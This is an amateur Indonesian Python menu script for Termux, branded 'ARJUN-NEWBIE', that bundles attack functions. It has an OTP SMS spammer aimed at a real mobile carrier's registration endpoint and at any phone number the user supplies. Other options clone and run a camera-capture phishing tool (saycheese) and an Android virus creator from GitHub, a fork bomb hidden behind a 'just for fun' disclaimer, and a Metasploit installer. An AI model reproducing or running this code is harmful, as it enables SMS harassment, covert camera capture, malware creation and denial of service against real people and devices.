# versi 2.7 Coding utf 8 Android
# Import Module

import os, sys, random, time

# Create Caracter Berjalan

def mengetik(s):
  for c in s + '\n':
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(random.random() * 0.2)
os.system('clear')
time.sleep(1)
mengetik('\033[91m   |» ★★★\033[0m \033[92mPLEASE SUBCRIBE MY CHANELS  ARJUN-NEWBIE\033[0m \033[91m★★★ «|\033[0m')
time.sleep(2)

os.system('clear')
ban = """
                      \033[91m ./+o+-
                  yyyyy- -yyyyyy+
               ://+//////-yyyyyyo
           .++ .:/++++++/-.+sss/`
         .:++o:  /++++++++/:--:/-
        o:+o+:++.`..```.-/oo+++++/
       .:+o:+o/.          `+sssoo+/   CREATE BY : ARJUN-NEWBIE
  .++/+:+oo+o:`             /sssooo.  Chanel Yt : ARJUN-NEWBIE\033[0m\033[97m
 /+++//+:`oo+o     I'am      /::--:.  MY TEAM   : KEBUMEN GREY
 \+/+o+++`o++o  ARJUN-NEWBIE ++////.  SUPPORT   : CLI
  .++.o+++oo+:`             /dddhhh.
       .+.o+oo:.          `oddhhhh+
        \+.++o+o``-````.:ohdhhhhh+
         `:o+++ `ohhhhhhhhyo++os:
           .o:`.syhhhhhhh/.oo++o`
               /osyyyyyyo++ooo+++/
                   ````` +oo+++o\:
                          `oo++. \033[0m
"""
os.system("python lok.py")
menu = """
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
\033[97m1. SPAM SMS TRI PREMIUM  \033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[0m\033[97m|\033[0m
\033[97m2. SADAP KAMERA SAYCHEESE\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[97m|\033[0m
\033[97m3. CREATE VIRUS CREATOR NEW\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
\033[97m4. ENCODE TEXT BASE64 NEW\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
\033[97m5. DECODE TEXT BASE64 NEW\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
\033[97m6. SANGAT BERBAHAYA LORD24\033[0m          \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
\033[97m7. INSTALL METASPLOIT NEW\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|————\033[0m\033[97m|\033[0m
\033[97m0. EXITING PROGRAM SCRIPT\033[0m           \033[91m|\033[0m\033[92mON √\033[0m\033[97m|\033[0m
\033[91m——————————————————————————————————\033[0m  \033[91m|____\033[0m\033[97m|\033[0m
"""
print(menu)
print ("\033[92m|————[★]")
print ("\033[92m|\033[0m")
print ("\033[92m|\033[0m")
pil = input("\033[92m|————[\033[0m\033[91mINPUT NUMBER\033[0m\033[92m]—» \033[0m")

def menu1():
    if pil == '1' or pil == '01':
       time.sleep(2)
       os.system('clear')
       os.system('python sp.py')
       import requests
       f = requests.Session()
       url = "https://registrasi.tri.co.id/daftar/generateOTP"
       print ("\033[91mMasukan Nomor Telpon Contoh: 0/62 08386975***\033[0m")
       no = input("\033[92mNO TELPON : \033[0m")
       data = {
       "msisdn":no
       }
       result = f.post(url, data=data).text
       if '200' in result:
           ex =  ("\033[92mSPAM SUCCES TO {} [√]\033[0m".format(no))
           time.sleep(2)
       else:
           print ("\033[91mSPAM FAILED TO\033[0m", no)
       while True:
           print(ex)
           time.sleep(1)

menu1()

def menu2():
    if pil == '2' or pil == '02':
       time.sleep(2)
       os.system('clear')
       mengetik('\033[91m        ★★★\033[0m\033[95m INSTALLING SAYCHEESE PLEASE WAIT\033[0m \033[91m★★★\033[0m')
       os.system('pkg install python2 && pkg install php && pkg install openssh && gem install lolcat && pkg install git && git clone https://github.com/thelinuxchoice/saycheese && cd saycheese && bash saycheese.sh')
menu2()

def menu3():
    if pil == '3' or pil == '03':
       time.sleep(2)
       os.system('clear')
       mengetik('\033[91m«★★★\033[0m  \033[92mINSTALLING VIRUS MALICIOUS2 NEW\033[0m   \033[91m★★★»»\033[0m')
       os.system('pkg install python2 && pkg install python && pkg instaall python && git clone https://github.com/saydog/Virus-droid-creator && cd Virus-droid-creator && python2 dog.py')
menu3()

def menu4():
    if pil == '4' or pil == '04':
       time.sleep(2)
       os.system('clear')
       mengetik('\033[91m|» ★★★\033[0m \033[92mINSTALLING MODULE BASE64 PLEASE WAIT\033[0m \033[91m★★★ «|\033[0m')
       time.sleep(3)
       os.system("clear")
       time.sleep(1)
       os.system("python2 base.py")
menu4()
def menu5():
    if pil == "5" or pil == "05":
       time.sleep(2)
       os.system("clear")
       mengetik('\033[91m|» ★★★\033[0m\033[92m INSTALLING MODULE BASE64 DECODE\033[0m\033[91m★★★ «|\033[0m')
       time.sleep(2)
       os.system("clear")
       os.system("python decode.py")
menu5()

def menu6():
    if pil == "6" or pil == "06":
       time.sleep(2)
       os.system("clear")
       mengetik('\033[92m ———————————————————————————————————————————\033[0m')
       mengetik('\033[91m »            WARNING !!!                  «\033[0m')
       mengetik('\033[92m ———————————————————————————————————————————\033[0m')
       mengetik('\033[92m|»  saya tidak bertanggung jawab bila    «|\033[0m')
       mengetik('\033[92m|»  terjadi apa-apa script ini di buat   «|\033[0m')
       mengetik('\033[92m|»  hanya utk hiburan saja jangan baper:v«|\033[0m')
       mengetik('\033[92m|_________________________________________|\033[0m')
       os.system('clear')
       print ("|—» apabila anda ketik y dan ingin berhenti cukup ketik CTRL + z")
       print ("|—» maka otomatis akan berhenti")
       pio = input("Ingin Melanjutkan (Y/n) ")
       if pio == "y" or pio == "Y":
          while True:
              os.fork()
menu6()

def menu7():
    if pil == "7" or pil == "07":
       time.sleep(2)
       os.system("clear")
       os.system("python met.py")
       mengetik('\033[91m|» ★★\033[0m\033[92m INGIN MELANJUTKAN UNTUK MENGINSTALL METASPLOIT (y/N)\033[0m\033[91m ★★ «|\033[0m')
       print ("\033[92m|———[«★»]\033[0m")
       print ("\033[92m|\033[0m")
       lo = input("\033[92m|————[\033[0m\033[91mMETASPLOIT\033[0m\033[92m]—» \033[0m")
       if lo == "y" or lo == "Y":
          time.sleep(2)
          print ("\033[91m ____________________________________\033[0m")
          mengetik('\033[91m|«●»|\033[0m\033[92m   INSTALLING METASPLOIT\033[0m    \033[91m|«●»|\033[0m')
          print ("\033[91m ————————————————————————————————————\033[0m")
          os.system("pkg update -y && pkg upgrade -y && pkg install root-repo -y && pkg install unstable-repo -y && pkg install x11-repo -y && pkg install metasploit -y")
menu7()

def menu8():
    if pil == "0":
       time.sleep(2)
       os.system("clear")
       mengetik("\033[91m|» ★★★\033[0m\033[92m Thanks Udah Pake Script Ini Ka\033[0m\033[91m ★★★ «|\033[0m")
       time.sleep(1)
       os.system("termux-open https://youtu.be/WMVsg7tZEiU")
       os.system("exit")
menu8()
